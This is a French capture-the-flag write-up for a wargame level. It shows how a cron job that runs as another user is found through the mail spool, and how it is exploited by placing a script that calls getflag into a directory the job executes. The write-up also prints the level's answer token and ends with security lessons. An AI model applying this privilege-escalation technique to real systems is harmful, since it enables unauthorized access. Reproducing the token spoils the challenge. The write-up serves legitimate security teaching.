# Niveau 05 - Exploitation de Tâche Cron

## Aperçu du défi

Le niveau 05 implique la découverte et l'exploitation d'une tâche planifiée (tâche cron) qui s'exécute avec des privilèges élevés. Le défi enseigne sur :

- L'identification des messages et notifications système
- La découverte des tâches cron par l'inspection du système
- La compréhension des permissions de fichiers et l'escalade de privilèges
- L'exploitation des chemins d'exécution de scripts non sécurisés

## Reconnaissance initiale

En se connectant en tant que `level05`, vous pourriez remarquer un message système :

```
You have new mail.
```

C'est notre premier indice - il y a quelque chose d'important dans la boîte aux lettres (mail spool).

## Investigation

### Étape 1 : Vérifier le courrier

Dans les systèmes Linux, le système de messagerie est un service de messagerie simple basé sur du texte qui permet aux utilisateurs et aux processus système de communiquer. Le courrier système est souvent utilisé par :

- Les tâches cron pour rapporter des erreurs ou des sorties
- Les administrateurs système pour notifier les utilisateurs
- Les services système pour rapporter des informations critiques

Le courrier de chaque utilisateur est généralement stocké dans un fichier à `/var/mail/nom_utilisateur` ou `/var/spool/mail/nom_utilisateur`. Lorsque vous voyez un message "You have new mail", cela vaut la peine d'enquêter car il contient souvent des informations système importantes.

```bash
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Cela révèle une tâche cron qui s'exécute toutes les 2 minutes en tant qu'utilisateur `flag05`, exécutant `/usr/sbin/openarenaserver`.

#### La planification Cron (5 premiers champs)

- Première position (`*/2`) : S'exécute toutes les 2 minutes (`*/2` signifie "toutes les 2" dans la position des minutes)
- Deuxième position (`*`) : Toutes les heures
- Troisième position (`*`) : Tous les jours du mois
- Quatrième position (`*`) : Tous les mois
- Cinquième position (`*`) : Tous les jours de la semaine
  Cela se traduit donc par : "Exécuter toutes les 2 minutes, 24h/24, 7j/7"

#### La partie commande

- `su` : Commande pour changer d'utilisateur (Switch user)
- `-c` : Option qui signifie "exécuter la commande suivante"
- `"sh /usr/sbin/openarenaserver"` : La commande à exécuter (exécute le script en utilisant `sh`)
- `-` : Fournit un environnement propre pour la nouvelle session utilisateur
- `flag05` : L'utilisateur vers lequel basculer lors de l'exécution de la commande

### Étape 2 : Examiner le script

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Le script :

- Utilise une boucle `for` pour itérer sur tous les fichiers dans `/opt/openarenaserver/`
- Pour chaque fichier trouvé :
  - Définit une limite de temps CPU de 5 secondes (`ulimit -t 5`)
  - Exécute le fichier avec bash en mode débogage (`bash -x`)
  - Supprime le fichier après exécution (`rm -f`)
- Le script s'exécute avec les permissions de `flag05` grâce à la tâche cron

## Analyse de la vulnérabilité

La vulnérabilité réside dans le fait que le script exécute n'importe quel fichier placé dans `/opt/openarenaserver/` avec les permissions de `flag05`.

## Stratégie d'exploitation

1. Créer un script dans le répertoire cible qui exécute `getflag`.
2. Le rendre exécutable.
3. Attendre que la tâche cron l'exécute (dans les 2 minutes).
4. Le résultat sera capturé pour une visualisation ultérieure.

## Étapes d'exploitation

### Étape 1 : Créer un script qui capture le drapeau

```bash
$ echo '#!/bin/sh' > /opt/openarenaserver/exploit.sh
$ echo 'getflag > /tmp/flag05' >> /opt/openarenaserver/exploit.sh
$ chmod +x /opt/openarenaserver/exploit.sh
```

### Étape 2 : Attendre l'exécution

Attendre jusqu'à 2 minutes que la tâche cron exécute notre script.

### Étape 3 : Récupérer la sortie capturée

```bash
$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Leçons de sécurité

1. **Principe du moindre privilège** : Les tâches cron devraient s'exécuter avec les privilèges minimums nécessaires.

2. **Chemins de script sécurisés** : Les scripts qui s'exécutent avec des privilèges élevés devraient être dans des emplacements sécurisés non modifiables par les utilisateurs moins privilégiés.

3. **Validation des entrées** : La boucle `for` dans le script exécute n'importe quel fichier sans validation, créant un risque de sécurité.

4. **Audits de sécurité réguliers** : Les tâches cron devraient être régulièrement auditées pour les problèmes de sécurité.

## Résumé

Ce défi démontre un vecteur commun d'escalade de privilèges via une configuration de tâche cron non sécurisée. En abusant d'un script qui exécute automatiquement des fichiers créés par l'utilisateur, nous avons pu escalader vers les privilèges de `flag05` et capturer le jeton.

Le drapeau pour le niveau 05 est : `viuaaale9huek52boumoomioc`
